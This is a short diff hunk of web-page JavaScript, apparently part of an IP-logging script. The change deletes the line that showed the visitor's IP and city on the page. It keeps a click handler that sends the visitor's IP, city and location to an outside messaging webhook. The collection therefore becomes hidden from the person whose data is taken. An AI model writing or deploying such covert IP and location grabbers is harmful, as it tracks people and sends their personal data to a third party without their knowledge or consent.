@@ -28,7 +28,6 @@ loc = response.loc;
   
 $(".getip").on("click", function(){
   
-  document.getElementById("stuff").innerHTML = ip + ", " + city;
 
   discord_message(web, "ip found " + ip + ", " + city + ", " + loc);
 });
